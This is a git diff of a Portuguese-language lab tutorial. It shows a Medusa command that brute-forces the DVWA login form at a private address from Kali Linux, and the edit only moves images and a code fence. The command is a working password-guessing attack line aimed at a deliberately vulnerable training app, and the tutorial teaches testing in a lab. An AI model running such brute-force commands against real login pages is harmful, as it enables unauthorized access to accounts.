@@ -372,7 +372,6 @@ medusa -h 192.168.10.3 \
 ## Exemplo prático completo
 
 Executar no Kali Linux:
-<img width="725" height="258" alt="Image" src="https://github.com/user-attachments/assets/ba4ee48c-0dc5-4cb5-9228-d3ac62e5f060" />
 
 
 medusa -h 192.168.10.3 \
@@ -381,11 +380,12 @@ medusa -h 192.168.10.3 \
        -M http \
        -m FORM:'/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=Login failed' \
        -t 10
-```
 
 Vai iniciar as tentativas de login brute force no formulário do DVWA, testando todos os usuários e senhas de suas wordlists.
 
 Quando liberar acesso, Medusa imprime mensagem de sucesso.
+
+![Tela de acesso](images/acesso_form.png)
 
 
 
